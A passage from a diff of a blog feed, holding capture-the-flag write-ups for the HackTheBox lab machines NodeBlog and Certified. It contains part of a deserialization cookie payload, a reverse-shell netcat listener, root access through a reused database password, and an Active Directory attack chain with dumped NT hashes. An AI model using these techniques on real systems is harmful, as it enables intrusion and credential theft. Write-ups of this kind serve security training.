class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Cfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now start a netcat listener:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1337
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Change your cookie and go to any page like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-9.png&quot; alt=&quot;nodeblog-9.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We couldn’t read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/user.txt&lt;/code&gt; for strange reasons. Looking at the permissions shows likely it was pointing to a user that is non-existent on the machine:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; ~
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/..&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.bash_logout&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.bashrc&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.profile&apos;&lt;/span&gt;: Permission deniedRoot/SYSTEM
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.cache&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.sudo_as_admin_successful&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.bash_history&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.pm2&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.mongorc.js&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.dbshell&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/user.txt&apos;&lt;/span&gt;: Permission denied
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.viminfo&apos;&lt;/span&gt;: Permission denied
-total 0
-d????????? ? ? ? ?            ? &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-d????????? ? ? ? ?            ? ..
--????????? ? ? ? ?            ? .bash_history
--????????? ? ? ? ?            ? .bash_logout
--????????? ? ? ? ?            ? .bashrc
-d????????? ? ? ? ?            ? .cache
--????????? ? ? ? ?            ? .dbshell
--????????? ? ? ? ?            ? .mongorc.js
-d????????? ? ? ? ?            ? .pm2
--????????? ? ? ? ?            ? .profile
--????????? ? ? ? ?            ? .sudo_as_admin_successful
--????????? ? ? ? ?            ? .viminfo
--????????? ? ? ? ?            ? user.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So let’s gain ownership again:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +rwx ~
-admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; ~
-total 36
-drwxr-xr-x 1 admin admin   220 Jan  3  2022 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 1 root  root     10 Dec 27  2021 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin  1863 Dec 31  2021 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin   220 Feb 25  2020 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin  3771 Feb 25  2020 .bashrc
-drwx------ 1 admin admin    40 Jul  2  2021 .cache
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin   125 Dec 13  2021 .dbshell
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin     0 Dec 13  2021 .mongorc.js
-drwxrwxr-x 1 admin admin   158 Jan  3  2022 .pm2
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin   807 Feb 25  2020 .profile
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin     0 Jul  2  2021 .sudo_as_admin_successful
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin 10950 Jan  3  2022 .viminfo
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  root     33 Jun 29 17:11 user.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now we can read it:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/user.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-10.png&quot; alt=&quot;nodeblog-10.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-3-privilege-escalation-admin---root&quot;&gt;📈 3. Privilege Escalation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;)&lt;/h2&gt;
-
-&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps -aux&lt;/code&gt; reveals that mongodb is running locally:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mongodb      801  0.2  1.8 983452 76092 ?        Ssl  17:10   0:05 /usr/bin/mongod &lt;span class=&quot;nt&quot;&gt;--unixSocketPrefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/run/mongodb &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt; /etc/mongodb.conf
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Let’s check it out:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:~$ mongo
-mongo
-MongoDB shell version v3.6.8
-connecting to: mongodb://127.0.0.1:27017
-Implicit session: session { &quot;id&quot; : UUID(&quot;e37625b7-321d-4f73-ae2e-1e670d048e26&quot;) }
-MongoDB server version: 3.6.8
-show dbs
-admin   0.000GB
-blog    0.000GB
-config  0.000GB
-local   0.000GB
-use blog
-switched to db blog
-show collections
-articles
-users
-db.users.find()
-{ &quot;_id&quot; : ObjectId(&quot;61b7380ae5814df6030d2373&quot;), &quot;createdAt&quot; : ISODate(&quot;2021-12-13T12:09:46.009Z&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;IppsecSaysPleaseSubscribe&quot;, &quot;__v&quot; : 0 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Admin’s password seems to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IppsecSaysPleaseSubscribe&lt;/code&gt;. I won’t subscribe tho :P&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin: IppsecSaysPleaseSubscribe
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin on nodeblog:
-    env_reset, mail_badpass,
-    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
-
-User admin may run the following commands on nodeblog:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Indeed. The credentials work and we can run anything as root. Let’s read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; then:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
-&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-11.png&quot; alt=&quot;nodeblog-11.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Easy game.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-learnings&quot;&gt;🧠 Learnings&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Sanitize Object Inputs for NoSQL:&lt;/strong&gt; To prevent NoSQL injection, ensure user inputs are validated as strict strings rather than blindly passing objects. Attackers can pass objects like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{&quot;$ne&quot;: &quot;&quot;}&lt;/code&gt; to completely bypass authentication logic when queries aren’t sanitized or type-checked.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Disable External Entities in XML Parsers:&lt;/strong&gt; Secure XML parsing by explicitly disabling external entity resolution (DTD/XXE defenses). This prevents attackers from using file URIs to read sensitive local system files or source code.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Avoid Unsafe Deserialization:&lt;/strong&gt; Never use modules like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node-serialize&lt;/code&gt; on untrusted user data like cookies. Passing manipulated objects to these functions can execute arbitrary JavaScript functions instantly. Stick to standard, safer data formats like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON.parse()&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Enforce Strong Password Hygiene:&lt;/strong&gt; Avoid storing sensitive credentials in cleartext within databases. Additionally, reuse of application passwords for administrative system logins (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access) drastically increases the impact of a database breach.&lt;/li&gt;
-&lt;/ol&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Certified</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-certified/"/>
-    <updated>2026-06-23T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-certified/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;h1 id=&quot;-certified&quot;&gt;🎯 Certified&lt;/h1&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;strong&gt;OS:&lt;/strong&gt; Windows&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Medium&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;IP:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.231.186&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-htb.png&quot; alt=&quot;certified.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;️-tldr--attack-chain&quot;&gt;⛓️ TL;DR / Attack Chain&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Foothold:&lt;/strong&gt; Starting with the provided initial credentials for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;judith.mader&lt;/code&gt;. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteOwner&lt;/code&gt; permissions over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MANAGEMENT&lt;/code&gt; group to change its owner, granting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteMembers&lt;/code&gt; rights, and adding user to the group. From there, leveraging &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenericWrite&lt;/code&gt; access over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;management_svc&lt;/code&gt; to execute a Shadow Credentials attack using Certipy to fetch the NT hash for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;management_svc&lt;/code&gt;, allowing an Evil-WinRM login to grab &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;management_svc&lt;/code&gt; has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenericAll&lt;/code&gt; over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt;. Executed a second Shadow Credentials attack to pull the NT hash for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;PrivEsc:&lt;/strong&gt; Enumerated certificate templates locating &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CertifiedAuthentication&lt;/code&gt;, which is vulnerable to ESC9. Using management_svc’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenericAll&lt;/code&gt; privilege over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt; to change UPN to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;, requested a certificate mapping to the Administrator, changed the UPN back to its original state, and authenticated using the certificate to dump the Administrator’s NT hash and grab &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-loot--creds&quot;&gt;🔑 Loot &amp;amp; Creds&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;User&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Credential&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Where / How&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;judith.mader&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;judith09&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Initial access credentials provided for the engagement.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;management_svc&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a091c1832bcdd4677c28b5a6a1295584&lt;/code&gt; (NT Hash)&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Obtained via Certipy shadow credentials attack.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b4b86f45c6018f1b664f70805f45d8f2&lt;/code&gt; (NT Hash)&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Obtained via Certipy shadow credentials attack.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0d5b49608bbce1751f708748f67e2d34&lt;/code&gt; (NT Hash)&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Recovered using the ESC9 certificate template attack path.&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-0-setup--global-variables&quot;&gt;🔧 0. Setup &amp;amp; Global Variables&lt;/h2&gt;
-&lt;p&gt;&lt;em&gt;Run this in your terminal once so you can copy-paste the rest of the commands blindly.&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.129.231.186&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;certified.htb&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;USERNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;judith.mader&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PASSWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;judith09&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;# sudo timedatectl set-ntp off &amp;amp;&amp;amp; \ # this in case ntpdate&apos;s work is reset automatically&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ntpdate &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; dc01.certified.htb&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-1-enumeration&quot;&gt;🔍 1. Enumeration&lt;/h2&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; nmap &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; ./nmap/nmap
-Starting Nmap 7.99 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2026-06-23 12:41 +0200
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;certified.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.231.186&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.030s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65515 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2026-06-23 17:43:20Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
